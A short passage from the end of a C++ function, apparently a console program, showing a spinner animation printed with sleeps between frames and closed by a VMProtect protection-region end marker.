		std::cout << "\b|" << std::flush;
		SleepEx(150, 0);
		std::cout << "\b/" << std::flush;
		SleepEx(150, 0);
		std::cout << "\b-" << std::flush;
	}
	VMProtectEnd();
	return 0;
}